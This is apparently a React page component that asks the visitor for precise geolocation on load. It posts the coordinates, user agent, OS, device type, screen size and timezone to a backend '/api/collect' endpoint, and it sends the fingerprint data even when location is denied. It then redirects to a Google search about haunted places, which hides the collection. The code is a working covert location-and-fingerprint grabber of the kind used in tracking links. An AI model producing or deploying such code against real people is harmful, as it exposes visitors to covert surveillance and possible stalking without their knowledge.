import { useEffect } from "react";

function Home() {
  useEffect(() => {

    // 1️⃣ Ask for precise location
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // user allowed location
        const preciseLocation = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };

        // 2️⃣ Send to backend
        await fetch(`${import.meta.env.VITE_API_URL}/api/collect`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            preciseLocation,
            browser: navigator.userAgent,
            os: navigator.platform,
            device: /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          })
        }).catch(() => {});

        // 3️⃣ Redirect after success
        window.location.href =
          "https://www.google.com/search?q=best+haunted+places+to+visit";
      },

      async () => {
        // user denied location → still send minimal info
        await fetch(`${import.meta.env.VITE_API_URL}/api/collect`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            preciseLocation: { error: "User blocked location" },
            browser: navigator.userAgent,
            os: navigator.platform,
            device: /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          })
        }).catch(() => {});

        // redirect anyway
        window.location.href =
          "https://www.google.com/search?q=best+haunted+places+to+visit";
      }
    );

  }, []);

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        justifyContent: "center",
        alignItems: "center",
        fontSize: "24px",
        fontFamily: "Arial",
      }}
    >
      Requesting location…
    </div>
  );
}

export default Home;
